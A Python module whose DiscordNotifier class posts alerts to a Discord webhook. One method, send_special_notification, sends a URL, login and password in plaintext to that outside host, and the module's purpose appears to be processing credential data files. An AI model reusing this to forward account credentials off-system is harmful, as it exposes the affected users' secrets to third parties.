import asyncio
from typing import Optional
import aiohttp
from src.utils.logger import get_logger
from src.config.settings import Settings
import telegram

logger = get_logger(__name__)

class DiscordNotifier:
    def __init__(self):
        self.settings = Settings()
        self.webhook_url = self.settings.discord_webhook_url

    async def send_notification(self, filename: str, amount_inserted: int, amount_in_file: int) -> bool:
        """Send notification to Discord webhook."""
        embed = {
            "title": "New data inserted successfully",
            "color": 5814783,
            "fields": [
                {"name": "Filename", "value": filename, "inline": False},
                {"name": "Amount Inserted", "value": str(amount_inserted), "inline": False},
                {"name": "Amount in File", "value": str(amount_in_file), "inline": False}
            ]
        }

        data = {
            "embeds": [embed]
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, json=data) as response:
                    if response.status != 204:
                        logger.error(f"Failed to send Discord webhook. Status code: {response.status}")
                        return False
                    return True    
        except Exception as e:
            logger.error(f"Error sending Discord webhook: {e}")
            return False

    async def send_special_notification(self, special_url: str, url: str, login: str, password: str) -> bool:
        """Send notification to Discord webhook."""
        embed = {
            "title": "New data inserted successfully",
            "color": 5814783,
            "fields": [
                {"name": "Special Url", "value": special_url, "inline": False},
                {"name": "Url", "value": url, "inline": False},
                {"name": "Login", "value": login, "inline": False},
                {"name": "Password", "value": password, "inline": False}
            ]
        }

        data = {
            "embeds": [embed]
        }

        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.webhook_url, json=data) as response:
                    if response.status != 204:
                        logger.error(f"Failed to send Discord webhook. Status code: {response.status}")
                        return False
                    return True    
        except Exception as e:
            logger.error(f"Error sending Discord webhook: {e}")
            return False

    @staticmethod
    def create_embed(title: str, fields: list, color: int = 5814783) -> dict:
        """Create Discord embed object."""
        return {
            "title": title,
            "color": color,
            "fields": [
                {"name": field["name"], "value": field["value"], "inline": field.get("inline", False)}
                for field in fields
            ]
        }